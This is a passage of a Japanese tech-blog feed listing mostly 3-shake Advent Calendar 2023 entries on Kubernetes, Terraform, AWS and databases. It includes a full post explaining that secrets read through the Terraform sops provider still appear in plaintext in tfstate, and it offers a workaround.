コマンドを使用することで、既存のTerraformのコードをPulumiのコードに変換することができます。ただし、変換できないコードはTODOコメントが付く。90%~95%は変換が対応しているとのこと。pulumi convert --from terraform --language typescriptまとめPulumiの概要と基本操作をTerraformと対比しながら説明してきました。新規プロジェクトである程度複雑な処理をしたい。プログラミング言語に精通している人がメンバーにいる。そういった場合にはPulumiは良さそうに思えます。しかしながら、ある程度Terraformで出来上がっているプロジェクトをPulumiに移行するのはそれなりに大変なので、プロジェクトの規模感とコストに見合うかを考えて導入するか考えると良いでしょう。また、複雑なことをしたいというのは、本当に必要とされていることなのでしょうか?冗長でも簡易的な書き方をした方が望ましい場合もあるかと思います。そのあたりの目利きをちゃんと考えたいところです。自分自身まだまだ使いこなせていないですし、追いきれてないPulumiのトピックもあるので、今後も選択肢の一つとして調べていきたいところです。","isoDate":"2023-12-15T15:00:00.000Z","dateMiliSeconds":1702652400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"sbt-github-acitons を使った CI の構築とプロジェクトの publish について","link":"https://zenn.dev/nomadblacky/articles/4c6a03aa5289c4","contentSnippet":"この記事は Scala Advent Calendar 2023 15日目 の記事です。 導入Scala プロジェクトを GitHub で開発する際には GitHub Actions を使用して CI を構築することが多いと思います。また、ライブラリの開発の場合は Maven Central に publish することも考えたいです。しかし、プロジェクトそれぞれに対応した GitHub Actions を構築するのは専門知識も必要で手間のかかる作業です。今回は sbt-github-actions という sbt プラグインを使用して、Scala プロジェクトの CI と ...","isoDate":"2023-12-15T03:00:00.000Z","dateMiliSeconds":1702609200000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"VPC エンドポイントポリシーで S3 バケットを制限する際の落とし穴","link":"https://zenn.dev/toshikish/articles/e846fa0c3de10f","contentSnippet":"状況設定AWS の VPC エンドポイントポリシーで VPC 内部から　Amazon S3 バケットへのアクセスを制限するために，以下のようなエンドポイントポリシーを設定するとします。s3-vpc-endpoint-policy.json{    \\"Version\\": \\"2012-10-17\\",    \\"Statement\\": [        {            \\"Effect\\": \\"Allow\\",            \\"Principal\\": \\"*\\",            \\"Action\\": \\"s3:*\\",            \\"Resource...","isoDate":"2023-12-14T22:00:00.000Z","dateMiliSeconds":1702591200000,"authorName":"toshikish","authorId":"toshikish"},{"title":"拝啓、CSSでドット絵を描きたくなったあの日(数週間前)の自分へ","link":"https://zenn.dev/nedoko_dok0dko/articles/c00b941f10501f","contentSnippet":"※ 3-shake Advent Calendar 2023の15日目のエントリー記事です。※ 12/21追記: CSS Advent Calendar 2023の21日目のエントリー記事として追加しました。投稿期間とズレてしまっていますが、CSSアドベントカレンダー盛り上がりの一助になればと思います。今年は数年離れていたデータエンジニアを再スタートし、データ基盤構築やGoogleCloudのProfessional試験を受けて合格したり…とテッキーな事に触れることが多い年でした。最近はDBやSRE領域に触れる機会もあり、自分の知識不足に凹みながらも「今は学ぶ時期だ」と1つずつ知識...","isoDate":"2023-12-14T15:31:58.000Z","dateMiliSeconds":1702567918000,"authorName":"seno","authorId":"seno"},{"title":"AWS Fault Injection Service で EKS の障害テストを行う","link":"https://zenn.dev/kyohei_saito/articles/6d1bcc1fe8610e","contentSnippet":"この記事は 3-shake Advent Calendar 2023 14 日目の記事です！ この記事に書いてあることこの記事では、AWS Fault Injection Service をつかって、EKS 上の Pod の障害テストを行う方法を説明します。この記事を書こうと思ったモチベーションとして、EKS 上のアプリケーションで障害テストをするために AWS Fault Injection Service (以降、「FIS」と記載します) を使用しようとしたところ、導入手順がいまいち分からなかったため、残しておこうと思ったためです。EC2 に障害を注入する場合は導入手順はシ...","isoDate":"2023-12-13T22:22:00.000Z","dateMiliSeconds":1702506120000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"[Kubernetes 1.27] Pod 停止時のフェーズ遷移の変更","link":"https://zenn.dev/toversus/articles/88ce2ea66b532d","contentSnippet":"Kubernetes 1.27 で KEP-3329: Retriable and non-retriable Pod failures for Jobs の一部として実装された [k/k#115331]: Give terminal phase correctly to all pods that will not be restarted により、Pod 停止時のフェーズが Running から Succeeded か Failed に遷移するようになりました。しかし、この変更が以下の予期せぬ問題を引き起こすことになります。[k/k#117018]: daemonset stuc...","isoDate":"2023-12-13T00:43:43.000Z","dateMiliSeconds":1702428223000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Unlocking Cloud Native Security","link":"https://speakerdeck.com/kyohmizu/unlocking-cloud-native-security","contentSnippet":"CloudNative Days Tokyo 2023 の登壇資料です。2023/12/12\\rhttps://event.cloudnativedays.jp/cndt2023","isoDate":"2023-12-12T05:00:00.000Z","dateMiliSeconds":1702357200000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Helmfile でちょっとしたリソースを追加したい","link":"https://zenn.dev/toshikish/articles/5ead548816e618","contentSnippet":"動機Helmfile で公式のチャートをインストールしていて，追加で関連リソースを追加したいことがあります。関連リソースの数が多い，内容が環境によって変わるなどの場合は，カスタムチャートを追加することになるでしょう。ただ，そこまで複雑ではない，関連リソースが数個レベルの場合，カスタムチャートだと大げさに感じることがあります。そこでどうすべきか迷っていたところ，同僚の toVersus さんに別の方法を教えていただきました。 extraTemplates 系の変数を使うHelm チャートによっては extraTemplates や extraObjects といった変数が...","isoDate":"2023-12-11T10:57:21.000Z","dateMiliSeconds":1702292241000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Amazon S3 バケットの terraform destroy に注意","link":"https://zenn.dev/toshikish/articles/190fe076cc63f4","contentSnippet":"TL;DRAmazon S3 バケットを削除する前には，必ずすべてのオブジェクトを削除しよう。aws_s3_bucket リソースの force_destroy 引数 を true にしてもよい。terraform destroy で削除すると，パブリックアクセスできる旨のアラートが出る場合があるので注意しよう。aws_s3_bucket_public_access_block リソースを terraform state rm するとアラートが出ない。マネジメントコンソールから削除してもアラートは出ない。 S3 バケットの terraform dest...","isoDate":"2023-12-11T09:03:06.000Z","dateMiliSeconds":1702285386000,"authorName":"toshikish","authorId":"toshikish"},{"title":"sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメント","link":"https://zenn.dev/nnaka2992/articles/blue_grean_on_postgres_with_sqldeff_and_pgroll","contentSnippet":"この記事はこのエントリー以下のアドベントカレンダーの11日目の記事です。3-shake Advent Calendar 2023昨日はtoyb0xによるTODOコメントをチケット管理するためのESLint Custom Ruleでした。PostgreSQL Advent Calendar 2023昨日は@ozozatyによるPostgreSQLのjsonb型でJSONパス式(JSONPath)を使うでした。 はじめにPostgreSQLではDDLはその性質からテーブルレベルでロックを取得してしまいます。SREやPlatform EngineeringなどDev...","isoDate":"2023-12-10T23:30:00.000Z","dateMiliSeconds":1702251000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"GitLab CIでKICSを実行する","link":"https://zenn.dev/tayusa/articles/d28865c5ce49c6","contentSnippet":"やることTerraformの静的解析を行うKICSの結果をgitlab-commentでMRに出力するhttps://github.com/yuyaban/gitlab-commentKICSの結果を基にMRにReviewdogで指摘するhttps://github.com/reviewdog/reviewdog KICSの実行$ kics scan --config kics.yamlkics.yamlpath: \\".\\" # 解析するTerraformの場所output-path: \\".\\" # 結果の出力先report-formats:...","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Golangでk8s Deploymentを再起動させる","link":"https://zenn.dev/tayusa/articles/a7df40b7d6fd5b","contentSnippet":"やることclient-goを使って複数のDeploymentを同時に再起動させる Golang Deploymentの取得Pod内であればrest.InClusterConfig()でPodのServiceAccountを使用するconfigを取得できるclientset.AppsV1().Deployments(namespace).Get(ctx, deploymentName, metav1.GetOptions{}) でDeploymentを取得NamespaceとDeploymentの名前が必要k8s.gopackage maini...","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"TypeScript で LangChain の最初の一歩","link":"https://zenn.dev/satohjohn/articles/9415f85be332e6","contentSnippet":"このエントリーは 3-shake Advent Calendar 2023 の10日目の記事です。今年は Python をガッツリ触ったり、 LLM などの方面に手を出してきており、新しいことにまみれております。その中で LLM のシステム作るんだったら Python だろ？っていう中で TypeScript でもちゃんとできるよーっていうことで紹介していきたいと思います。 私が、あんまり Python でアプリ作っていくのが好きじゃないのもありますもちろん、 Python よりも TypeScript のほうが機能が少なめではありますので、そのあたりは、目をつぶっております。今...","isoDate":"2023-12-09T15:00:00.000Z","dateMiliSeconds":1702134000000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"今よりちょっとだけ上手く文章を書くコツ","link":"https://qiita.com/kojake_300/items/c5def031a252323fae1c","contentSnippet":"この記事は、3-shake Advent Calendar 2023 9日目のエントリ記事です。技術的な話ではありませんはじめに国語がとても苦手だった私は、社会人になったときに日本語力の無さにかなり苦労しました。そんな中、「日本語の作文技術」という本を読み、わかりや...","isoDate":"2023-12-08T22:01:43.000Z","dateMiliSeconds":1702072903000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Terraformのsopsプロバイダーを使用するだけで機密情報は守られるのか","link":"https://blog.masasuzu.net/entry/2023/12/09/014230","contentSnippet":"qiita.comこの記事は、3-shake Advent Calendar 2023の9日目の記事となります。sops プロバイダーとは本当に安心?ドキュメントを調べる挙動を実験する結論ワークアラウンドsops プロバイダーとはcarlpett/terraform-provider-sops: A Terraform provider for reading Mozilla sops filesDocs overview | carlpett/sops | Terraform | Terraform RegistrysopsプロバイダーはMozilla sopsを使用して暗号化されたファイルから機密情報を取り出して、terraform上で使用できるようにしたものです。暗号化の鍵をAWS KMS等を使うことにより、KMSキーを使う権限を持つ人だけ機密情報にアクセスできるようにするものです。sopsで機密情報を暗号化することにより、平文で機密情報をgitレポジトリに保存することがなくなり安全ということになります。機密情報を管理したい。でも平文では保存したくない。そういう用途にこちらは使用されます。本当に安心?SOPSを使って機密情報を暗号化することによりgitレポジトリには機密情報が平文で残らない。これで安心と言われていますが、よく考えると機密情報をterraform実行時にはリソースに対して平文で与えているはずです。つまり、tfstate上は機密情報が平文で保存されています。例えば、tfstateがS3に保存されているとして、KMSキーへの権限がない人でもS3バケットにアクセスする権限があれば、平文の機密情報が見れてしまいます。あまりないと思いますが、tfstateをlocalに保存するようにしていてそれをgit管理していてらなんのために暗号化しているのか。。。。ということになります。こう考えると組織のポリシーによるが、sopsプロバイダーによる暗号化では不十分ではないかという疑問が生まれます。ドキュメントを調べるまずプロバイダードキュメントを当たってみます。Docs overview | carlpett/sops | Terraform | Terraform RegistryTo prevent plaintext secrets from being written to disk, you\xa0must\xa0use a secure remote state backend. See the\xa0official docs\xa0on\xa0Sensitive Data in State\xa0for more information.これが意味してるのはバックエンドをlocalにした場合平文で機密情報が書かれるので、安全なリモートバックエンドを利用すべきということだと思います。State: Sensitive Data | Terraform | HashiCorp Developer参照しろと言われたドキュメントの該当部分を読んでみましょう。ローカルディスクにtfstateを保存した場合は、機密情報が平文で保存されます。リモートにtfstateを保存する場合、保存時に暗号化されるかはバックエンドに依存します。基本的にリモートステートを使うことを推奨しています。例えば、Terraform Cloudを使う場合、tfstateは暗号化され、転送時もTLSで暗号化されます。S3を使う場合もSSE-S3やSSE-KMS等でサーバサイド暗号化を有効にしておくことで、保管時の暗号化がされます。バケットポリシーでHTTPSを強制することで通信時の暗号化も保証することができます。参考: 暗号化によるデータの保護 - Amazon Simple Storage Service参考: Amazon S3 のセキュリティのベストプラクティス - Amazon Simple Storage Serviceところがですね。保存時、通信時の暗号化をしても、terraform state pullすると平文でtfstateが手に入ってしまうんですよ。。。後述します。挙動を実験する以下のような設定ファイルを作ります。sopsで暗号化したdb_userとdb_passwordをパラメータストアに設定するものになります。tools-versionsterraform 1.5.5sops 3.7.3main.tfterraform {  required_version = \\"~> 1.5.5\\"  required_providers {    aws = {      source  = \\"hashicorp/aws\\"      version = \\"~> 5.15\\"    }    sops = {      source  = \\"carlpett/sops\\"      version = \\"~> 0.7.2\\"    }  }  backend \\"s3\\" {    region  = \\"ap-northeast-1\\"    bucket  = \\"xxxxxxxxxx\\"    key     = \\"test.tfstate\\"  }}provider \\"sops\\" {}provider \\"aws\\" {  region = \\"ap-northeast-1\\"}data \\"sops_file\\" \\"secrets\\" {  source_file = \\"secrets.yaml\\"}resource \\"aws_ssm_parameter\\" \\"db_user\\" {  type     = \\"String\\"  name     = \\"/test/db_user\\"  value    = data.sops_file.secrets.data.db_user}resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    = data.sops_file.secrets.data.db_password}暗号化前の secrets.yamldb_user: userdb_password: passwordapply結果がこちらとなります。terraform apply% export SOPS_KMS_ARN=arn:aws:kms:ap-northeast-1:xxxxxxxxx:key/yyyyyyyyyyyyyyyyyy% terraform applydata.sops_file.secrets: Reading...data.sops_file.secrets: Read complete after 1s [id=-]Terraform used the selected providers to generate the following execution plan. Resource actions areindicated with the following symbols:  + createTerraform will perform the following actions:  # aws_ssm_parameter.db_password will be created  + resource \\"aws_ssm_parameter\\" \\"db_password\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_password\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"SecureString\\"      + value          = (sensitive value)      + version        = (known after apply)    }  # aws_ssm_parameter.db_user will be created  + resource \\"aws_ssm_parameter\\" \\"db_user\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_user\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"String\\"      + value          = (sensitive value)      + version        = (known after apply)    }Plan: 2 to add, 0 to change, 0 to destroy.Do you want to perform these actions?  Terraform will perform the actions described above.  Only \'yes\' will be accepted to approve.  Enter a value: yesaws_ssm_parameter.db_password: Creating...aws_ssm_parameter.db_user: Creating...aws_ssm_parameter.db_user: Creation complete after 0s [id=/test/db_user]aws_ssm_parameter.db_password: Creation complete after 0s [id=/test/db_password]Apply complete! Resources: 2 added, 0 changed, 0 destroyed.terraform apply  8.91s user 0.78s system 124% cpu 7.811 totalstate showするとパラメータストアなのでsensitive扱いになっていて、見れません。これはいけるか?terraform state show% terraform state show aws_ssm_parameter.db_password# aws_ssm_parameter.db_password:resource \\"aws_ssm_parameter\\" \\"db_password\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\"    data_type = \\"text\\"    id        = \\"/test/db_password\\"    key_id    = \\"alias/aws/ssm\\"    name      = \\"/test/db_password\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"SecureString\\"    value     = (sensitive value)    version   = 1}% terraform state show aws_ssm_parameter.db_user    # aws_ssm_parameter.db_user:resource \\"aws_ssm_parameter\\" \\"db_user\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_user\\"    data_type = \\"text\\"    id        = \\"/test/db_user\\"    name      = \\"/test/db_user\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"String\\"    value     = (sensitive value)    version   = 1}ここで、terraform state pullをしてみて、tfstateファイルをローカルにダウンロードします。そのtfstateファイルの中の該当部分はこちらとなります。    {      \\"mode\\": \\"managed\\",      \\"type\\": \\"aws_ssm_parameter\\",      \\"name\\": \\"db_password\\",      \\"provider\\": \\"provider[\\\\\\"registry.terraform.io/hashicorp/aws\\\\\\"]\\",      \\"instances\\": [        {          \\"schema_version\\": 0,          \\"attributes\\": {            \\"allowed_pattern\\": \\"\\",            \\"arn\\": \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\",            \\"data_type\\": \\"text\\",            \\"description\\": \\"\\",            \\"id\\": \\"/test/db_password\\",            \\"insecure_value\\": null,            \\"key_id\\": \\"alias/aws/ssm\\",            \\"name\\": \\"/test/db_password\\",            \\"overwrite\\": null,            \\"tags\\": null,            \\"tags_all\\": {},            \\"tier\\": \\"Standard\\",            \\"type\\": \\"SecureString\\",            \\"value\\": \\"password\\",            \\"version\\": 1          },          \\"sensitive_attributes\\": [            [              {                \\"type\\": \\"get_attr\\",                \\"value\\": \\"value\\"              }            ]          ],          \\"private\\": \\"bnVsbA==\\",          \\"dependencies\\": [            \\"data.sops_file.secrets\\"          ]        }      ]    },tfstateファイルの中身をよく確認するとしっかり平文で見えています。残念。\\"value\\": \\"password\\",結論sopsプロバイダーを使用することによりgitレポジトリ上に機密情報を平文で保存することはなくなります。しかしながら、tfstateのデータ上では設定値が平文で保存されることを防ぐことはできません。terraform state pullする権限があれば、機密情報が見れてしまいます。運用組織のポリシーで、tfstateへのアクセス権限を適切に権限管理することができるのであれば、選択肢としては取りうります。暗号化のためのKMSキー、tfstateを保存するS3バケットを機密情報をアクセス可能な人のみ権限を与えることが徹底できればよいです。しかしながら、機密情報をいかなる場合でもローカルに平文で保存することが許容されない組織であれば、機密情報は手動で設定することを選択したほうが望ましいと思います。どうしても機密情報をterraformで管理したのであれば、クライアントサイドで暗号化した機密情報をterraformで管理し、アプリ等で使用時にクライアントサイドで復号を行う形も考えられます。安全かどうかは、tfstateの保存場所、tfstateへのアクセス権限、暗号化鍵のアクセス権限それぞれが適切に設定されているかどうかが鍵となります。他に何かうまい方法で機密情報を管理しているという方がいらっしゃれば、ご意見ください。ワークアラウンドこれは自分がよく使う手段となります。リソースの箱だけ作って、作成時にダミーの値を入れておき、実際の値は手動で設定するという手法です。ignore_changesを入れておくことで、手動で値を変更しても、terraform的には差分ができないようにしています。これにより、機密情報をterraformの外に追い出しつつも、機密情報を入れるリソース自体は監理するということが実現できます。resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    =  \\"Dummy\\"  lifecycle {    ignore_changes = [value]  }}","isoDate":"2023-12-08T16:42:30.000Z","dateMiliSeconds":1702053750000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AlloyDB omni on Kubernetesを眺める","link":"https://zenn.dev/nnaka2992/articles/viewing_alloydb_omni_operator","contentSnippet":"このエントリーは以下のアドベントカレンダーの6日目の記事です。3-shake Advent Calendar 2023 シリーズ1昨日は@bells17さんによるChainguard imagesについて調べてみたでした。PostgreSQL Advent Calendar 2023 シリーズ2Kubernetes Advent Calendar 2023昨日は@yassan168さんによるRKE2ノードのCiliumを使ったeBPFな帯域制限をする話でした。 背景を眺める2023年10月12日にAlloyDB OmniのGAに併せてAlloyDB Omni o...","isoDate":"2023-12-05T23:30:00.000Z","dateMiliSeconds":1701819000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Chainguard imagesについて調べてみた","link":"https://zenn.dev/bells17/articles/chainguard-images","contentSnippet":"※この記事は3-shake Advent Calendar 2023 シリーズ1の12月5日の記事です最近Chainguard imagesというdistrolessコンテナイメージについて知ったので、簡単に調べてみました。 Chainguard imagesとは？Chainguard imagesはChainguard社によって提供されているdistrolessを中心としたセキュアなコンテナイメージ群だ、という理解です。Wolfiという(おそらくこれもChainguard社が開発している)コンテナ・クラウドネイティブ用途向けのLinux undistroなOSを利用して各C...","isoDate":"2023-12-05T03:58:09.000Z","dateMiliSeconds":1701748689000,"authorName":"bells17","authorId":"bells17"},{"title":"Cloud Loggingについて","link":"https://zenn.dev/nedoko_dok0dko/articles/ef07acbb983d01","contentSnippet":"whatGoogle CloudのCloud Loggingについて基本概要など調べたことをまとめる適宜追記予定 Cloud Loggingとはhttps://cloud.google.com/logging/docs/overview?hl=jaGoogleCloud上のシステム等が生成したログを収集・保管・管理するための仕組み。基本的にGoogleCloud上のサービスが出力するログはCloud Loggingへと集められる。収集されたログはログバケットと呼ばれるストレージで保管され、期間が過ぎたら破棄するといった設定を行うことが可能。ログはコンソールのログ...","isoDate":"2023-12-04T11:05:41.000Z","dateMiliSeconds":1701687941000,"authorName":"seno","authorId":"seno"},{"title":"吉祥寺.pm35 でLTしてきました。 #kichijojipm","link":"https://blog.masasuzu.net/entry/2023/12/03/161754","contentSnippet":"吉祥寺.pm こと 句会吉祥寺.pm35 に参加して、LTしてきました。kichijojipm.connpass.com資料はこちら。言いたいこととしてはベストプラクティスなんてないよ。一般的によりよいプラクティスやパターンはあるけど、どんなときには適用できる銀の弾丸的なものはないから、自身の組織とサービスに合わせてくみ上げていきましょうということ。正解はひとつ!じゃない!!その上で、ざっくりとどんな選択肢と選択するための観点を述べていきました。まだ全然ブラッシュアップできるのでどこかでまとめてブログに書きたいところです。ちなみに最後に出てくる あなたらしく○○ は同僚のスライドのパロディです。毎回時間オーバーするのでトークで申し込んだ方が良いのでは?というツッコミはごもっともです。懇親会でもTerraformのお悩みとか短いですが話せて楽しかったです。また参加したいですね。","isoDate":"2023-12-03T07:17:54.000Z","dateMiliSeconds":1701587874000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Auroraアップグレード時のBlue/Green Deploymentsの利用","link":"https://zenn.dev/hakushou41/articles/70b83066cd1741","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 4日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめにAmazon Aurora2系について、標準サポート終了日(2024/10/31)まで1年を切りました。依然として、Aurora2系を利用しているシステムは多いのではないでしょうか。アプリケーションのテストや検証を考えると早めに動いていかなければならない時期となりました。本記事では、アップグレード方式・方針の一つとして、AWSからも推奨されているRDS Blue/Green Deplo...","isoDate":"2023-12-03T07:12:32.000Z","dateMiliSeconds":1701587552000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"Playwright Test generatorを利用したE2Eテスト ことはじめ","link":"https://zenn.dev/hakushou41/articles/65bc815b14354f","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 3日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに現在、私はマイクロサービスを運用するSREを支援する人として活動しています。運用チームやSREが主導となって実施するメンテナンスやアップデート作業などでは、アップデート後の動作確認として、ブラウザを介したWebアプリケーションの簡易目視確認をします。これらの確認項目は、手順書へ項目を記載し、必要に応じてエビデンスをスクリーンショットで取得する必要があります。確認作業を網羅的にしようとす...","isoDate":"2023-12-02T15:00:00.000Z","dateMiliSeconds":1701529200000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"2023-12-01 吉祥寺.pm ベストプラクティスと組織とIaC","link":"https://speakerdeck.com/masasuzu/2022-12-01-ji-xiang-si-dot-pm","contentSnippet":"ベストプラクティスなんてものはない","isoDate":"2023-12-01T05:00:00.000Z","dateMiliSeconds":1701406800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"データベースエンジニアのためのDB on Kubernetes入門ガイド","link":"https://zenn.dev/nnaka2992/articles/db_on_k8s_guide_for_db_engineers","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 1日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに1959年にW. C. McGeeがデータベースという概念を提唱してから約65年、様々なアーキテクチャのデータベースが提案され様々なプラットフォームで利用されてきました。古くはメインフレームを中心に動作していたデータベースは、マイコンブームとともにそのアーキテクチャを変えながらにオープン系システムへと主戦場を移して行きました。オープン系が主流になってからもその進化は止まることなく、ベア...","isoDate":"2023-11-30T23:30:01.000Z","dateMiliSeconds":1701387001000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KEP-4188: New kubelet gRPC API with endpoint returning local pods info","link":"https://zenn.dev/toversus/articles/791c7916e21059","contentSnippet":"!KEP 持ち寄り会 #1 の登壇資料です。2023/11/27 時点の KEP-4188 の内容です。Kubernetes 1.29 時点で機能として入っていないので注意して下さい。また、後半の文章は考察を含んでおり、正確な情報でない可能性があります。 概要KEP-4188 は、Kubelet に Pod Conditions を公開する gRPC API を追加する KEP です。Pod Conditions は Status フィールドに含まれています。❯ kubectl get pods -n kube-system coredns-5d78c9869d-8gglh ...","isoDate":"2023-11-27T08:23:13.000Z","dateMiliSeconds":1701073393000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"KEP-3063: Dynamic resource allocation","link":"https://speakerdeck.com/bells17/kep-3063-dynamic-resource-allocation","contentSnippet":"KEP持ち寄り会で発表した資料です。\\rKubernetesのKEP \\"Dynamic resource allocation\\" に関する情報をまとめた内容になります。\\r\\rイベントURL: https://kep.connpass.com/event/299651/\\r参考資料:\\r\\rhttps://zenn.dev/toversus/articles/fe2aa06f133b49 \\rhttps://kubernetes.io/blog/2022/12/15/dynamic-resource-allocation/ \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/README.md \\rhttps://github.com/kubernetes-sigs/dra-example-driver/blob/main/demo/demo-apps.png \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/components.png \\rhttps://github.com/cncf-tags/container-device-interface \\rhttps://github.com/containerd/containerd/blob/v1.7.9/pkg/cri/server/container_create_linux.go#L417-L419 \\rhttps://github.com/cncf-tags/container-device-interface/blob/main/pkg/cdi/container-edits.go#L70-L148 \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/README.md \\rhttps://github.com/kubernetes/kubernetes/pull/111023 \\rhttps://github.com/orgs/kubernetes/projects/95/views/1 \\rhttps://github.com/kubernetes/dynamic-resource-allocation \\rhttps://www.cncf.io/projects/akri/ \\rhttps://github.com/kubernetes-sigs/dra-example-driver \\rhttps://github.com/NVIDIA/k8s-dra-driver \\rhttps://github.com/intel/intel-resource-drivers-for-kubernetes \\rhttps://github.com/intel/intel-device-plugins-for-kubernetes \\rhttps://docs.google.com/document/d/1BNWqgx_SmZDi-va_V31v3DnuVwYnF2EmN7D-O_fB6Oo/edit#heading=h.bxuci8gx6hna \\rhttps://drive.google.com/file/d/1iLg2FEAEilb1dcI27TnB19VYtbcvgKhS/view\\rhttps://developer.nvidia.com/blog/nvidia-gpu-operator-simplifying-gpu-management-in-kubernetes/ \\rhttps://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/overview.html \\rhttps://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/cdi.html \\rhttps://intel.github.io/intel-device-plugins-for-kubernetes/README.html \\rhttps://github.com/NVIDIA/k8s-device-plugin\\rhttps://blogs.nvidia.com/blog/multi-instance-gpus/ \\rhttps://developer.nvidia.com/blog/nvidia-ampere-architecture-in-depth/ \\rhttps://groups.google.com/a/kubernetes.io/g/dev/c/BDtCFfXQbw0?pli=1\\rhttps://kubernetes.slack.com/archives/C032ZE66A2X/p1700215190429689 \\rhttps://kubernetes.slack.com/archives/C032ZE66A2X/p1700215190429689","isoDate":"2023-11-27T05:00:00.000Z","dateMiliSeconds":1701061200000,"authorName":"bells17","authorId":"bells17"},{"title":"BigQueryの メタデータってどこから見れるの？","link":"https://zenn.dev/nedoko_dok0dko/articles/f6ccafeceac4a3","contentSnippet":"whatBigQueryのメタデータの取得先について簡単にまとめたもの BigQueryのメタデータ、調べることが出来るの?A. 出来るということで、メタデータの主な取得先について記載していく テーブル情報やレコード数BigQueryにはINFORMATION_SCHEMAという、メタデータなどを保持しているビューが存在している。これらを利用してメタデータを取得することが出来る。ただし、テーブルの更新日やテーブルのデータ量については記録されていない。https://cloud.google.com/bigquery/docs/information-sche...","isoDate":"2023-11-21T10:26:24.000Z","dateMiliSeconds":1700562384000,"authorName":"seno","authorId":"seno"},{"title":"ツールごとのOPA/Regoの書き方","link":"https://zenn.dev/tayusa/articles/63f286f4733a87","contentSnippet":"RegoとはKubernetesやTerraformの静的解析で既存のルールでは足りないときや自分でカスタマイズしたいときにRegoというポリシー言語でコードを書くhttps://www.openpolicyagent.org/docs/latest/policy-language/ Regoを利用できるツールの例conftesthttps://www.conftest.dev/自分で全部書くtrivyhttps://aquasecurity.github.io/trivy/latest/docs/scanner/misconfiguration/cust...","isoDate":"2023-11-16T03:05:53.000Z","dateMiliSeconds":1700103953000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"MinIO Client で Amazon S3 や Cloudflare R2 を利用する","link":"https://blog.1q77.com/2023/11/minio-client/","contentSnippet":"Cloudflare R2 は egress の費用がかからないということで手元のファイルのバックアップに使ってみようかなと思ったときにクライアントとして何を使おうかな aws cli 使うほどじゃないしなということで MinIO Client (mc) を使ってみたメモ。","isoDate":"2023-11-12T11:13:31.000Z","dateMiliSeconds":1699787611000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"kube-proxy入門","link":"https://speakerdeck.com/bells17/kube-proxyru-men","contentSnippet":"Kubernetes Novice Tokyo #28 の登壇資料です\\r\\rイベントURL: https://k8s-novice-jp.connpass.com/event/293157/\\r配信URL: https://www.youtube.com/watch?v=LSW51Cm0Wc0\\r\\rコードリーディングメモ:\\rhttps://zenn.dev/bells17/scraps/5e41da598a8266\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.2 \\rhttps://speakerdeck.com/ryusa/servicewotazunete3000xing-kuberneteskodorideingufalselu \\rhttps://qiita.com/Tocyuki/items/6d90a1ec4dd8e991a1ce \\rhttps://oxynotes.com/?p=6361#5 \\rhttps://atmarkit.itmedia.co.jp/ait/articles/1002/09/news119.html \\rhttps://hana-shin.hatenablog.com/entry/2022/06/21/215757 \\rhttps://qiita.com/syui/items/27020b970775a0c508ba \\rhttps://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands \\rhttps://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/explicitmatches.html 